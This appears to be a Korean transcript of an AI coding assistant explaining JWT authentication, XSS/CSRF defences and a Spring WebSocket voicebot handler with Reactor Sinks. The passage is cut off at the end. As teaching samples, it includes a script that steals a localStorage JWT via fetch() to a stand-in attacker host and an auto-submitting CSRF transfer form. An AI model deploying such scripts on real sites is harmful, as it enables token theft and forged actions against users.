    사용자 로그인 토큰              →  sub, exp, iat, (nbf)
    토큰 재사용 방지 필요 시        →  jti 추가

● JWT는 하나, 용도에 따라 내용물이 다를 뿐

  JWT 구조 자체(Header.Payload.Signature)와 서명/검증 방식은 완전히 동일합니다. 다른 것은 Payload 안에 뭘 담느냐입니다.

  ---
  비교

  ┌───────────┬────────────────────────────────┬──────────────────┐
  │           │     서버 간 통신 (이 코드)     │  사용자 로그인   │
  ├───────────┼────────────────────────────────┼──────────────────┤
  │ 신원 증명 │ 서비스 계정 JSON의 private_key │ 아이디/비밀번호  │
  ├───────────┼────────────────────────────────┼──────────────────┤
  │ 서명 주체 │ 우리 서버                      │ 우리 서버        │
  ├───────────┼────────────────────────────────┼──────────────────┤
  │ 검증 주체 │ Google 서버                    │ 우리 서버        │
  ├───────────┼────────────────────────────────┼──────────────────┤
  │ key pair  │ Google이 발급                  │ 우리가 직접 생성 │
  ├───────────┼────────────────────────────────┼──────────────────┤
  │ Payload   │ iss, aud, exp, iat             │ sub, exp, iat    │
  └───────────┴────────────────────────────────┴──────────────────┘

  ---
  처리 과정 비교

  서버 간 통신 (이 코드)

  서비스 계정 JSON (private_key)
          ↓ 처음부터 키가 있음
  JWT 서명
          ↓
  Google OAuth2 서버에 Access Token 교환 요청
          ↓
  Access Token으로 TTS API 호출

  사용자 로그인

  사용자가 아이디/비밀번호 입력
          ↓ DB에서 비밀번호 검증
  JWT 서명 (우리 서버의 secret key로)
          ↓
  클라이언트에게 JWT 발급
          ↓
  이후 요청마다 JWT 첨부 → 우리 서버가 검증

  ---
  핵심 차이

  서버 간 통신:  키가 처음부터 있음 → 바로 JWT 서명
                                      → 상대 서버(Google)가 검증

  사용자 로그인: 비밀번호 먼저 확인 → JWT 서명 후 클라이언트에 발급
                                      → 우리 서버가 검증

  JWT 기술 자체는 동일하고, "누가 서명하고 누가 검증하느냐" 와 "신원을 어떻게 확인하느냐" 만 다릅니다.

✻ Baked for 13s

❯ 사용자 로그인 JWT 는 secret key 를 어떻게 만들어?

● 사용자 로그인 JWT의 secret key

  서버 간 통신과 달리, 우리가 직접 만듭니다.

  ---
  만드는 방법

  방법 1 — 랜덤 문자열 (가장 흔함, HMAC 방식)

  # 터미널에서 랜덤 생성
  openssl rand -base64 32
  # 결과: K7gNU3sdo+OL0wNhqoVWhr5v6s1xm4aBDnJFp6VK2E=

  이걸 .env 파일에 저장합니다:

  JWT_SECRET=K7gNU3sdo+OL0wNhqoVWhr5v6s1xm4aBDnJFp6VK2E=

  Spring Boot에서 사용:

  @Value("${jwt.secret}")
  private String secretKey;

  // 서명
  Jwts.builder()
      .subject(userId)
      .signWith(Keys.hmacShaKeyFor(secretKey.getBytes()))
      .compact();

  ---
  방법 2 — RSA key pair 생성 (더 안전)

  # private key 생성
  openssl genrsa -out private.pem 2048

  # public key 추출
  openssl rsa -in private.pem -pubout -out public.pem

  private.pem  →  서버가 JWT 서명할 때 사용
  public.pem   →  JWT 검증할 때 사용 (외부에 공개 가능)

  ---
  두 방식 비교

  ┌──────────┬────────────────────────┬────────────────────────┐
  │          │   HMAC + 랜덤 문자열   │      RSA key pair      │
  ├──────────┼────────────────────────┼────────────────────────┤
  │ 서명 키  │ secret key 하나        │ private key            │
  ├──────────┼────────────────────────┼────────────────────────┤
  │ 검증 키  │ secret key 하나 (동일) │ public key (별도)      │
  ├──────────┼────────────────────────┼────────────────────────┤
  │ 키 관리  │ 단순                   │ 복잡                   │
  ├──────────┼────────────────────────┼────────────────────────┤
  │ 사용처   │ 단일 서버              │ 여러 서버, 외부 공개   │
  ├──────────┼────────────────────────┼────────────────────────┤
  │ 알고리즘 │ HS256                  │ RS256 (이 코드와 동일) │
  └──────────┴────────────────────────┴────────────────────────┘

  ---
  핵심

  서버 간 통신 (이 코드):  Google이 key pair 발급 → JSON 파일로 줌
  사용자 로그인:           우리가 직접 생성 → .env 파일에 보관

  secret key는 절대 외부에 노출되면 안 됩니다. 누구든 이 키가 있으면 유효한 JWT를 마음대로 만들 수 있기 때문입니다.

✻ Brewed for 12s

❯ [Server]자체적으로 만든 Private key, Public key 생성. 모든 사용사 적용 > [Client] ID, Password > [Server] ID, Password 검증 > [Server]서버의 Private Key 로 JWT
  서명 > [Client] 필요한 기능 호출(with JWT 서명) > [Server] 요청 기능 수락 전에 받은 JWT 서명을 자체적올 만든 Public Key 로 검증 후 서버스 제공 => 맞어?

● 네, 완벽하게 맞습니다.

  그림으로 정리하면:

  [Server] 사전 준비
  private key + public key 생성 (최초 1회)
  ─────────────────────────────────────────

  [Client]                        [Server]
      │                               │
      │── ID, Password ──────────────▶│
      │                               │ DB에서 검증
      │                               │ ✅ 일치
      │                               │ private key로 JWT 서명
      │◀── JWT 발급 ──────────────────│
      │                               │
      │                               │
      │── 기능 요청 (JWT 첨부) ────────▶│
      │                               │ public key로 JWT 검증
      │                               │ ✅ 유효
      │◀── 서비스 응답 ───────────────│
      │                               │
      │── 기능 요청 (JWT 첨부) ────────▶│
      │                               │ public key로 JWT 검증
      │                               │ ✅ 유효
      │◀── 서비스 응답 ───────────────│

  ---
  한 가지 추가하면:

  로그인 이후 요청부터는
  ID/Password 검증 없이
  JWT 검증만으로 서비스 제공

  → DB 조회 없음
  → 빠름
  → 이것이 JWT의 핵심 장점

  JWT가 만료(exp)되면 클라이언트는 다시 ID/Password로 로그인해서 새 JWT를 받아야 합니다.

✻ Sautéed for 9s

❯ 그러면 이 방식은 Access Token 필요 없이 AWT 서명으로 검증하는거네. 맞어?

● 네, 맞습니다.

  정확히 말하면 JWT 자체가 Access Token 입니다.

  ---
  용어 정리

  사용자 로그인 방식:

  JWT = Access Token
        (둘이 별개가 아님)

  로그인 성공 → JWT 발급 → 이게 곧 Access Token

  ---
  이 프로젝트 코드(Google)와 비교하면 혼란스러운 이유

  Google 서버 간 통신:
  JWT 서명 ──▶ Google OAuth2 서버에 제출
                ↓
           Access Token 별도 발급
                ↓
           Access Token으로 TTS API 호출

  → JWT와 Access Token이 별개


  사용자 로그인:
  ID/Password 검증
                ↓
           JWT 발급
                ↓
           JWT로 바로 API 호출

  → JWT가 곧 Access Token

  ---
  왜 Google은 JWT와 Access Token을 분리했나

  Google API는 수많은 외부 서버가 호출합니다. Access Token을 별도로 발급해서 수명을 짧게(1시간) 관리하면 보안 통제가 쉽기 때문입니다.

  자체 서버에서는 그럴 필요 없이 JWT 하나로 끝내는 것이 더 단순합니다.

✻ Worked for 8s

❯ 그러면 사용자 로그인 방식의 JWT 서명도 유효시간 있는지?

● 네, 있습니다.

  Payload의 exp 필드가 유효시간입니다.

  # JWT 발급 시
  payload = {
      'sub': 'user123',        # 사용자 ID
      'exp': now + 3600,       # 1시간 후 만료
      'iat': now               # 발급 시각
  }

  ---
  만료되면?

  [Client]                        [Server]
      │                               │
      │── 기능 요청 (만료된 JWT) ──────▶│
      │                               │ public key로 검증
      │                               │ exp 확인 → 만료됨 ❌
      │◀── 401 Unauthorized ──────────│
      │                               │
      │── ID/Password 재로그인 ────────▶│
      │                               │ 검증 후 새 JWT 발급
      │◀── 새 JWT ────────────────────│

  ---
  유효시간을 짧게 vs 길게

  ┌────────┬────────────────────────┬────────────────────┐
  │        │      짧게 (1시간)      │    길게 (30일)     │
  ├────────┼────────────────────────┼────────────────────┤
  │ 보안   │ 토큰 탈취 피해 최소화  │ 탈취 시 오래 위험  │
  ├────────┼────────────────────────┼────────────────────┤
  │ 불편함 │ 자주 재로그인          │ 재로그인 거의 없음 │
  ├────────┼────────────────────────┼────────────────────┤
  │ 사용처 │ 금융, 보안 중요 서비스 │ 일반 앱, 쇼핑몰    │
  └────────┴────────────────────────┴────────────────────┘

  ---
  실무에서 많이 쓰는 패턴

  재로그인 불편함을 줄이기 위해 두 가지 토큰을 함께 발급합니다.

  Access Token  → 유효시간 짧음 (1시간) — API 호출에 사용
  Refresh Token → 유효시간 김 (30일)  — Access Token 재발급에만 사용

  Access Token 만료
          ↓
  Refresh Token으로 새 Access Token 자동 발급
          ↓
  사용자는 재로그인 없이 계속 사용

✻ Sautéed for 11s

❯ 사용자 로그인은 왜 sub 에서 사용자 계정이 들어가지?

● sub (Subject) 에 사용자 계정이 들어가는 이유

  JWT는 "이 토큰의 주인이 누구냐" 를 표현해야 합니다.

  ---
  iss vs sub 차이

  iss (Issuer)  = 토큰을 발급한 주체  → 서버
  sub (Subject) = 토큰의 주인        → 사용자

  예시:

  {
      "iss": "voicebot-server",   ← 이 토큰을 만든 건 voicebot 서버
      "sub": "user123",           ← 이 토큰의 주인은 user123
      "exp": 1750000000
  }

  ---
  왜 sub에 넣어야 하나

  서버가 JWT를 검증한 뒤 "이 요청이 누구의 요청인지" 알아야 서비스를 제공할 수 있기 때문입니다.

  [Client] 김철수가 로그인
          ↓
  [Server] sub: "user123" 담아서 JWT 발급
          ↓
  [Client] 내 정보 조회 요청 (JWT 첨부)
          ↓
  [Server] JWT 검증
          ↓ sub 꺼냄
          ↓ "user123" 의 정보를 DB에서 조회
          ↓
  [Client] 김철수 정보 반환

  sub 없이는 JWT가 유효해도 누구의 요청인지 알 수 없습니다.

  ---
  서버 간 통신에 sub가 없는 이유

  서버 간 통신:  iss 만으로 충분
                 "voicebot 서버가 요청했다" → 신원 하나뿐

  사용자 로그인: sub 가 필수
                 "voicebot 서버가 발급한, user123의 토큰" → 신원 두 개
                 (발급자 + 사용자)

  한 줄 요약:

  ▎ 서버가 JWT 검증 후 어떤 사용자의 요청인지 식별하기 위해 sub에 사용자 계정을 담습니다.

✻ Baked for 17s

❯ 그래서 사용자별로 JWT 서명이 다르겠네. 지문(SHA-256) 다를테니.

● 네, 정확합니다.

  sub가 다르면 Payload가 다르고, Payload가 다르면 SHA-256 지문이 다르고, 지문이 다르면 Signature가 달라집니다.

  김철수 JWT:
  Payload = { "sub": "user123", "exp": 1750000000 }
          ↓ SHA-256
  지문 = a1b2c3d4...
          ↓ private key 서명
  Signature = xK9mP2...


  이영희 JWT:
  Payload = { "sub": "user456", "exp": 1750000000 }
          ↓ SHA-256
  지문 = 9f8e7d6c...   ← sub 하나 달라졌을 뿐인데 완전히 다름
          ↓ private key 서명
  Signature = qR7nL4...

  ---
  여기서 SHA-256 눈사태 효과가 발휘됩니다

  "user123"  →  SHA-256  →  a1b2c3d4e5f6...
  "user124"  →  SHA-256  →  9f3k2m8p1q7r...
                             ↑
                      딱 한 글자 차이인데
                      결과가 완전히 달라짐

  이 특성 덕분에:

  공격자가 JWT의 sub를 user123 → user456 으로 변조 시도
          ↓
  Payload가 바뀌면 지문이 바뀜
          ↓
  원래 Signature와 불일치 ❌
          ↓
  서버가 위조 감지

  ▎ Signature가 사용자마다 다르기 때문에, 다른 사람의 토큰을 자기 것처럼 쓰거나 내용을 바꾸는 것이 불가능합니다.

✻ Churned for 16s

❯ 그러면 사용자별로 JWT 서명은 다르지만 DB 에 저장하지 않고 메모리에 갖고 있나? 왜냐하면 1시간이면 없어질테니까.

● 아닙니다. 서버는 JWT를 저장하지 않습니다. 메모리에도 없습니다.

  ---
  JWT의 핵심 설계 원칙 — 무상태(Stateless)

  발급한 JWT를 서버가 기억하지 않는다.
  검증에 필요한 모든 정보가 JWT 안에 이미 들어있다.

  ---
  그러면 어디에 있나

  [Server] JWT 발급
          ↓ 클라이언트에게 전달 후 서버는 잊어버림
  [Client] JWT 보관 (브라우저 localStorage 또는 쿠키)
          ↓ 요청마다 JWT 첨부해서 서버로 보냄
  [Server] 받은 JWT를 그 자리에서 검증
          ↓ public key + exp 확인만 하면 됨
          ↓ 유효하면 서비스 제공
          ↓ 검증 끝나면 또 잊어버림

  ---
  검증에 DB가 필요 없는 이유

  JWT 안에 이미 다 있음:
      sub → 누구인지
      exp → 유효한지
      Signature → 위조됐는지

  → DB 조회 없이 public key 하나로 모든 것 검증 가능

  ---
  세션 방식과 비교

  세션 방식:                      JWT 방식:
  서버가 세션 저장 (DB/메모리)     서버는 아무것도 저장 안 함
          ↓                               ↓
  클라이언트가 세션ID 전달         클라이언트가 JWT 전달
          ↓                               ↓
  서버가 DB에서 세션 조회          서버가 JWT 자체를 검증
  (DB 조회 발생)                   (DB 조회 없음)

  ▎ JWT가 빠른 이유가 바로 이것입니다. 서버는 발급과 검증만 할 뿐, 아무것도 저장하지 않습니다.

✻ Baked for 12s

※ recap: JWT 구조와 동작 원리를 E2E-TEST-REAL.md 코드 기반으로 학습 중입니다. 서버 간 통신과 사용자 로그인 방식의 차이까지 이해했고, 다음 질문을 기다리는
  상태입니다.

❯ 클라이언트가 JWT 를 localStorage 에 저장하면 보안 문제 없어?

● 있습니다. localStorage는 보안상 취약합니다.

  ---
  localStorage의 문제 — XSS 공격

  공격자가 악성 스크립트를 웹페이지에 심으면
  JavaScript로 localStorage에 접근 가능

  document.cookie       → 쿠키는 httpOnly 설정 시 접근 불가
  localStorage.getItem('jwt')  → 무조건 접근 가능 ❌

  ---
  저장 방식별 비교

  ┌──────────────────┬──────────────┬─────────────────┬───────────────┐
  │                  │ localStorage │ 쿠키 (httpOnly) │ 메모리 (변수) │
  ├──────────────────┼──────────────┼─────────────────┼───────────────┤
  │ XSS 공격         │ 취약 ❌      │ 안전 ✅         │ 안전 ✅       │
  ├──────────────────┼──────────────┼─────────────────┼───────────────┤
  │ CSRF 공격        │ 안전 ✅      │ 취약 ❌         │ 안전 ✅       │
  ├──────────────────┼──────────────┼─────────────────┼───────────────┤
  │ 브라우저 종료 시 │ 유지         │ 유지            │ 사라짐        │
  ├──────────────────┼──────────────┼─────────────────┼───────────────┤
  │ 구현 난이도      │ 쉬움         │ 보통            │ 보통          │
  └──────────────────┴──────────────┴─────────────────┴───────────────┘

  ---
  XSS vs CSRF

  XSS (Cross Site Scripting):
  공격자 스크립트 → localStorage JWT 탈취
  → localStorage는 취약, httpOnly 쿠키는 안전

  CSRF (Cross Site Request Forgery):
  다른 사이트에서 사용자 몰래 요청 전송
  → 쿠키는 자동 첨부되어 취약, localStorage는 안전

  ---
  실무에서 많이 쓰는 방식

  Access Token  → 메모리(변수)에 보관 (탈취 어려움, 브라우저 종료 시 사라짐)
  Refresh Token → httpOnly 쿠키에 보관 (JavaScript 접근 불가)

  Access Token 만료
          ↓
  Refresh Token으로 서버에 재발급 요청
          ↓ (쿠키는 자동 첨부)
  새 Access Token 메모리에 저장
          ↓
  사용자는 재로그인 없이 계속 사용

  ---
  한 줄 요약

  ▎ localStorage는 편하지만 XSS에 취약합니다. 보안이 중요한 서비스라면 Access Token은 메모리, Refresh Token은 httpOnly 쿠키에 보관하는 것이 실무 권장 방식입니다.

✻ Worked for 11s

❯ httpOnly 쿠키는 CSRF 어떻게 방어해? CSRF, XSS 무엇인지 부터 설명해줘.

● XSS (Cross Site Scripting)

  "내 사이트에 악성 스크립트를 심는 공격"

  공격자가 댓글에 악성 스크립트 작성:
  <script>
      var jwt = localStorage.getItem('token');
      fetch('https://공격자서버.com?jwt=' + jwt);  // JWT 탈취
  </script>

  피해자가 그 댓글 페이지 방문
          ↓
  브라우저가 스크립트 실행
          ↓
  JWT가 공격자 서버로 전송 ❌

  핵심: 내 사이트 안에서 악성 코드가 실행됩니다.

  ---
  CSRF (Cross Site Request Forgery)

  "다른 사이트에서 내 사이트로 몰래 요청을 보내는 공격"

  피해자가 voicebot.com 에 로그인 중 (쿠키 보유)

  공격자가 악성 사이트 링크를 이메일로 전송
  피해자가 클릭 → 악성 사이트 방문

  악성 사이트 코드:
  <form action="https://voicebot.com/transfer" method="POST">
      <input name="amount" value="100만원">
  </form>
  <script>document.forms[0].submit()</script>

          ↓
  브라우저가 voicebot.com 으로 요청 전송
  쿠키는 자동으로 첨부 ❌
          ↓
  서버는 정상 요청으로 착각

  핵심: 다른 사이트에서 피해자 몰래 요청이 발생합니다.

  ---
  둘의 차이

  XSS:  내 사이트 안에서 악성 스크립트 실행 → 데이터 탈취
  CSRF: 다른 사이트에서 내 사이트로 요청   → 몰래 행동 실행

  ---
  httpOnly 쿠키의 CSRF 방어 방법

  httpOnly 쿠키 자체는 CSRF를 막지 못합니다. 별도 방어가 필요합니다.

  CSRF Token 방식 (가장 흔함)

  [Server] 페이지 요청 시 CSRF Token 발급
          ↓ HTML에 숨겨서 전달
  [Client] 폼 전송 시 CSRF Token 함께 전송

  <input type="hidden" name="csrf_token" value="aB3xK9mP">

  [Server] 쿠키의 JWT + CSRF Token 둘 다 검증
          ↓
  CSRF Token은 JavaScript로만 읽을 수 있음
          ↓
  악성 사이트는 CSRF Token을 모름 → 요청 차단 ✅

  ---
  왜 CSRF Token이 효과적인가

  악성 사이트가 voicebot.com 으로 요청 시:
      쿠키     → 브라우저가 자동 첨부 (막을 수 없음)
      CSRF Token → 악성 사이트가 알 수 없음 ❌

  서버가 CSRF Token 없는 요청 거부
          ↓
  CSRF 공격 차단 ✅

  ---
  정리

  ┌──────┬───────────────────────────────────────────┐
  │ 공격 │                   방어                    │
  ├──────┼───────────────────────────────────────────┤
  │ XSS  │ httpOnly 쿠키 (JavaScript 접근 차단)      │
  ├──────┼───────────────────────────────────────────┤
  │ CSRF │ CSRF Token (악성 사이트가 모르는 값 요구) │
  └──────┴───────────────────────────────────────────┘

  ▎ XSS와 CSRF는 서로 다른 경로의 공격이라 방어 방법도 다릅니다. 둘 다 막으려면 httpOnly 쿠키 + CSRF Token 을 함께 써야 합니다.

```

# WebSocket
```
❯ 현재 소스에서 WebSocket 수신 받는 곳과 WebSocket 으로 보내는 부분이 어디이고 이를 이해하기 위한 개념과 예시를 쉽게 설명해주었으면 해.

● 먼저 소스에서 WebSocket 관련 파일을 찾아볼게요.

● Bash(find /workspaces/voicebot-js/src -name "*.java" | xargs grep -l "WebSocket\|websocket" 2>/dev/null)
  ⎿  /workspaces/voicebot-js/src/main/java/com/voicebot/config/WebSocketConfig.java
     /workspaces/voicebot-js/src/main/java/com/voicebot/call/CtiWebSocketHandler.java
     /workspaces/voicebot-js/src/main/java/com/voicebot/service/stt/RtzrWebSocketSttService.java

  Read 2 files (ctrl+o to expand)

● 소스를 확인했습니다. 이제 설명드릴게요.

  ---
  WebSocket 개념 — HTTP와 비교

  HTTP (일반 통신):
  클라이언트 ──요청──▶ 서버
  클라이언트 ◀──응답── 서버
  (요청 없으면 서버가 먼저 보낼 수 없음)

  WebSocket (실시간 통신):
  클라이언트 ◀──────▶ 서버
  (연결 유지 — 양쪽이 언제든 먼저 보낼 수 있음)

  전화 통화와 같습니다. 연결되면 양쪽이 자유롭게 말할 수 있습니다.

  ---
  이 프로젝트에서 WebSocket 수신 위치

  1. 연결 수립 — afterConnectionEstablished() (line 44)

  // CtiWebSocketHandler.java:44
  public void afterConnectionEstablished(WebSocketSession session) {
      // 브라우저가 ws://localhost:8080/ws/cti 로 접속하면 여기 실행
      String callId = "CTI-" + UUID.randomUUID()...
      // Sink 생성 — 음성 청크를 STT로 흘려보내는 파이프
      Sinks.Many<byte[]> sink = Sinks.many().unicast().onBackpressureBuffer();
  }

  2. 음성 청크 수신 — handleBinaryMessage() (line 69)

  // CtiWebSocketHandler.java:69
  protected void handleBinaryMessage(WebSocketSession session, BinaryMessage message) {
      // 브라우저에서 250ms마다 보내는 음성 데이터(binary) 수신
      byte[] chunk = message.getPayload().array();
      sink.tryEmitNext(chunk);  // STT로 전달
  }

  3. JSON 이벤트 수신 — handleTextMessage() (line 80)

  // CtiWebSocketHandler.java:80
  protected void handleTextMessage(WebSocketSession session, TextMessage message) {
      // 브라우저에서 보내는 JSON 이벤트 수신
      // { "type": "CTI_EVENT", "event": "CALL_START" }
      // { "type": "CTI_EVENT", "event": "CALL_END" }
  }

  4. 연결 종료 — afterConnectionClosed() (line 96)

  // CtiWebSocketHandler.java:96
  public void afterConnectionClosed(WebSocketSession session, CloseStatus status) {
      // 브라우저가 연결을 끊으면 여기 실행
      // Sink 완료, 구독 취소, Map 정리
  }

  ---
  WebSocket 송신 위치

  JSON 송신 — sendJson() (line 202)

  // CtiWebSocketHandler.java:202
  private void sendJson(WebSocketSession session, Object data) throws Exception {
      session.sendMessage(new TextMessage(objectMapper.writeValueAsString(data)));
  }

  호출되는 곳들 (line 125~162):

  sendJson(session, Map.of("type", "STT_FINAL",    "text", finalText));   // STT 결과
  sendJson(session, Map.of("type", "BOT_THINKING"));                       // 처리 중
  sendJson(session, Map.of("type", "LLM_RESULT",   "response", llmResponse)); // LLM 결과
  sendJson(session, Map.of("type", "TTS_TEXT",     "text", llmResponse)); // TTS 텍스트
  sendJson(session, Map.of("type", "BOT_READY"));                          // 다음 발화 대기

  음성 데이터 송신 — sendBinary() (line 208)

  // CtiWebSocketHandler.java:208
  private void sendBinary(WebSocketSession session, byte[] data) throws Exception {
      session.sendMessage(new BinaryMessage(data));  // TTS 음성(PCM) 전송
  }

  ---
  전체 흐름

  [브라우저]                          [서버 CtiWebSocketHandler]

  ws://localhost:8080/ws/cti 접속
          ──────────────────────────▶ afterConnectionEstablished()
                                      callId 발급, Sink 생성

  { type: CTI_EVENT, event: CALL_START }
          ──────────────────────────▶ handleTextMessage()

  음성 청크 binary (250ms마다)
          ──────────────────────────▶ handleBinaryMessage()
                                      sink.tryEmitNext(chunk)
                                              ↓
                                      SttService → LlmService → TtsService

          ◀────────────────────────── sendJson("STT_FINAL")
          ◀────────────────────────── sendJson("LLM_RESULT")
          ◀────────────────────────── sendJson("TTS_TEXT")
          ◀────────────────────────── sendBinary(음성 PCM)
          ◀────────────────────────── sendJson("BOT_READY")

  { type: CTI_EVENT, event: CALL_END }
          ──────────────────────────▶ handleTextMessage()
                                      afterConnectionClosed()

  ---
  WebSocket 등록 위치

  // WebSocketConfig.java:19
  registry.addHandler(ctiWebSocketHandler, "/ws/cti")
  //                                         ↑
  //                  브라우저가 접속하는 URL 경로

  /ws/cti 로 접속 요청이 오면 CtiWebSocketHandler 로 연결해주는 설정입니다.

```

```
❯ Sink 가 뭐야?

● Sink란?

  데이터를 밀어넣으면 반대편으로 흘러나오는 파이프입니다.

  [브라우저 음성 청크]                    [STT 서비스]
      250ms마다 binary 전송               Flux<byte[]> 로 받음

  handleBinaryMessage()                  sttService.recognize(flux)
      sink.tryEmitNext(chunk)  ────▶  sink.asFlux()
           ↑                               ↑
        밀어넣는 쪽                    꺼내 쓰는 쪽

  ---
  왜 필요한가

  STT 서비스는 Flux<byte[]> (데이터 스트림)를 받습니다.

  그런데 음성 청크는 WebSocket 콜백(handleBinaryMessage)으로 하나씩 툭툭 던져집니다.

  WebSocket 콜백 방식:          STT가 원하는 방식:
  툭 (250ms 후) 툭 툭 툭  →    Flux (연속 스트림)

  둘을 연결하는 다리가 필요
          ↓
       Sink

  ---
  이 코드에서 Sink 생성

  // CtiWebSocketHandler.java:49
  Sinks.Many<byte[]> sink = Sinks.many().unicast().onBackpressureBuffer();

  각 부분의 의미:

  Sinks.many()           → 여러 개의 데이터를 흘려보낼 수 있음
       .unicast()        → 구독자가 1개 (STT 서비스 하나만 받음)
       .onBackpressureBuffer()  → STT가 느리면 버퍼에 쌓아둠 (버리지 않음)

  ---
  데이터 흐름

  // 넣는 쪽 — handleBinaryMessage():69
  sink.tryEmitNext(chunk);   // 음성 청크 밀어넣기

  // 꺼내는 쪽 — afterConnectionEstablished():57
  sttService.recognize(sink.asFlux(), callId)
  //                   ↑
  //         Sink를 Flux로 변환해서 STT에 전달

  ---
  전화 1통 = Sink 1개

  // sessionId → Sink 로 관리
  private final Map<String, Sinks.Many<byte[]>> sinkMap = new ConcurrentHashMap<>();
  //            ↑                ↑
  //        연결 식별자        각 전화통화의 파이프

  전화 A 연결 → Sink A 생성
  전화 B 연결 → Sink B 생성
  전화 C 연결 → Sink C 생성

  각각 독립적으로 음성 청크 처리

  ---
  통화 종료 시

  // afterConnectionClosed():102
  sink.tryEmitComplete();  // 파이프 닫기 → STT에 "더 이상 데이터 없음" 신호

  ---
  한 줄 요약

  ▎ WebSocket 콜백으로 하나씩 들어오는 음성 청크를 STT가 원하는 연속 스트림(Flux) 으로 변환해주는 연결 다리입니다.

```

```
❯ `tryEmitNext` 랑 `tryEmitComplete` 차이가 뭐야?

● tryEmitNext vs tryEmitComplete

  ---
  수도꼭지로 비유

  Sink = 수도관

  tryEmitNext(data)   →  물 흘려보내기 (데이터 전송)
  tryEmitComplete()   →  수도꼭지 잠그기 (스트림 종료)

  ---
  코드에서 위치

  // 음성 청크가 올 때마다 — handleBinaryMessage():75
  sink.tryEmitNext(chunk);
  // "데이터 하나 보낸다"

  // 통화 종료 시 — afterConnectionClosed():102
  sink.tryEmitComplete();
  // "더 이상 데이터 없다, 끝"

  ---
  실제 흐름

  통화 시작
      │
      ├── tryEmitNext(chunk1)   →  STT로 전달
      ├── tryEmitNext(chunk2)   →  STT로 전달
      ├── tryEmitNext(chunk3)   →  STT로 전달
      │   (250ms마다 계속...)
      │
  통화 종료
      │
      └── tryEmitComplete()     →  STT에 "끝났다" 신호
                                    STT가 최종 결과 반환

  ---
  try 가 붙은 이유

  // try 없는 버전 — 실패하면 예외 던짐
  sink.emitNext(chunk, FAIL_FAST);

  // try 버전 — 실패해도 예외 없이 결과만 반환
  Sinks.EmitResult result = sink.tryEmitNext(chunk);
  // SUCCESS, FAIL_ZERO_SUBSCRIBER, FAIL_OVERFLOW 등

  이 코드에서는 결과를 따로 처리하지 않는데, 음성 청크는 일부 유실돼도 STT가 나머지로 인식할 수 있어서입니다.

  ---
  한 줄 요약

  tryEmitNext()     →  데이터를 파이프에 밀어넣기
  tryEmitComplete() →  파이프를 닫아서 스트림 종료 신호 보내기

```

```
❯ `onBackpressureBuffer` 가 뭐야?

● onBackpressureBuffer

  Backpressure(역압) 부터 이해해야 합니다.

  ---
  Backpressure란?

  생산자(Producer)가 데이터를 보내는 속도
  소비자(Consumer)가 데이터를 처리하는 속도

  이 둘이 다를 때 문제 발생

  이 코드에서:

  생산자: 브라우저가 250ms마다 음성 청크 전송  (빠름)
  소비자: STT 서비스가 음성 인식 처리         (느림)

  브라우저 ──청크──▶ Sink ──▶ STT
    빠름                        느림

  ---
  처리 방법 3가지

  onBackpressureBuffer()   →  버퍼에 쌓아두고 순서대로 처리
  onBackpressureDrop()     →  소비자가 바쁘면 새 데이터 버림
  onBackpressureLatest()   →  가장 최신 데이터만 유지, 나머지 버림

  ---
  음성인식에서 Buffer를 쓰는 이유

  Drop 방식:
  청크1 처리 중
  청크2 도착 → 버림 ❌
  청크3 도착 → 버림 ❌
  청크4 처리

  결과: "안녕...요"  ← 중간이 잘려서 인식 불가

  Buffer 방식:
  청크1 처리 중
  청크2 도착 → 버퍼에 보관
  청크3 도착 → 버퍼에 보관
  청크1 처리 완료 → 청크2 처리 → 청크3 처리

  결과: "안녕하세요"  ← 전체 인식 ✅

  ---
  버퍼 구조

  브라우저
    │
    ├── chunk1 ──▶ [chunk1][chunk2][chunk3][chunk4]  버퍼
    ├── chunk2                ↓ 순서대로 꺼냄
    ├── chunk3             STT 처리
    └── chunk4

  ---
  주의점

  버퍼는 메모리를 씁니다. 기본값은 무제한이라 통화가 매우 길어지면 메모리가 부족할 수 있습니다.

  // 기본 (무제한)
  Sinks.many().unicast().onBackpressureBuffer();

  // 제한 설정 시
  Sinks.many().unicast().onBackpressureBuffer(256);
  //                                           ↑
  //                                  최대 256개 청크만 보관

  이 프로젝트는 전화 통화 단위라 통화 1건당 Sink 1개이고, 통화가 끝나면 Sink도 닫히므로 실용적으로 문제없는 구조입니다.

  ---
  한 줄 요약

  ▎ 생산자(브라우저)가 소비자(STT)보다 빠를 때, 데이터를 버리지 않고 버퍼에 쌓아두고 순서대로 처리하는 방식입니다.

```

```
❯ `unicast` 가 뭐야?

● unicast

  "구독자가 반드시 1개만 허용" 이라는 뜻입니다.

  ---
  방송 방식 비교

  unicast  (유니캐스트) →  1명에게만 전송
  multicast(멀티캐스트) →  여러 명에게 동시 전송
  broadcast(브로드캐스트) → 모두에게 전송

  TV로 비유하면:

  unicast   →  1:1 전화통화
  multicast →  단체 채팅방
  broadcast →  TV 방송 (모두에게)

  ---
  이 코드에서 unicast를 쓰는 이유

  음성 청크를 받는 소비자가 STT 서비스 하나뿐입니다.

  브라우저 음성 청크
          ↓
      Sink (unicast)
          ↓
      STT 서비스 (구독자 1개)

  2개 이상 구독하려 하면 에러가 납니다:

  sink.asFlux().subscribe(sttService1);  // ✅ 첫 번째 구독 성공
  sink.asFlux().subscribe(sttService2);  // ❌ 에러 — unicast는 1개만 허용

  ---
  multicast가 필요한 경우

  만약 음성 청크를 STT와 녹음 서비스 둘 다 에 보내야 한다면:

  // multicast 사용
  Sinks.many().multicast().onBackpressureBuffer();

          ↓ 같은 데이터를
  STT 서비스     (구독자 1)
  녹음 서비스    (구독자 2)

  ---
  한 줄 요약

  ▎ 이 프로젝트는 음성 청크를 STT 하나만 받으면 되므로 unicast, 여러 곳에 동시에 보내야 하면 multicast를 씁니다.

```

```
 `publishOn(Schedulers.boundedElastic())` 가 뭐야?

● publishOn(Schedulers.boundedElastic())

  두 개를 나눠서 이해해야 합니다.

  ---
  먼저 — 스레드가 뭔가

  스레드 = 작업을 처리하는 일꾼

  식당으로 비유:
  NIO 스레드      →  홀 서빙 직원 (빠르고 여러 테이블 동시 담당)
  boundedElastic  →  주방 직원 (시간 걸리는 요리 담당)

  ---
  NIO 스레드란?

  WebSocket, HTTP 요청을 받는 메인 일꾼입니다.

  NIO 스레드가 하는 일:
  - WebSocket 연결 수락
  - 음성 청크 수신
  - JSON 이벤트 수신
  - 응답 전송

  이 일꾼은 동시에 수천 개의 연결을 처리합니다. 그래서 절대 오래 붙잡아 두면 안 됩니다.

  NIO 스레드가 막히면:
  다른 모든 WebSocket 연결도 응답 불가 ❌

  ---
  문제 — llmService.chat()이 block()을 씁니다

  // LlmService 내부
  String result = webClient.post()
      ...
